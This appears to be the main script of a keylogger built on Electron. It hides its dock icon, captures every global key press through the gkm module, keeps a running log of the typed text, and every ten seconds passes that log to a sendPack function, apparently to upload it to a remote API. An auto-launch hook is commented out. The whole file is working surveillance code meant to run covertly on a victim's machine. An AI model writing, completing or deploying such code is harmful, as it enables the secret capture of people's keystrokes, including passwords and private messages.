const electron = require('electron');
const request = require('request');
const gkm = require('gkm');
const sendPack = require('./sendPack');
const prepareKey = require('./prepareKey');
// const autoLaunch = require('./autoLaunch');

const app = electron.app;

var logger = '';

app.on('ready', function () {
	app.dock.hide();

	gkm.events.on('key.*', function (key) {
		if (this.event === 'key.pressed') {
			key[0] == 'Backspace'
			? logger = logger.substring(0, logger.length - 1)
			: logger += prepareKey(key[0]);
		};
		console.log(logger);
	});

	setInterval(function () {
		console.log('Sending data to your API...');
		sendPack(logger);
	}, 10000);
});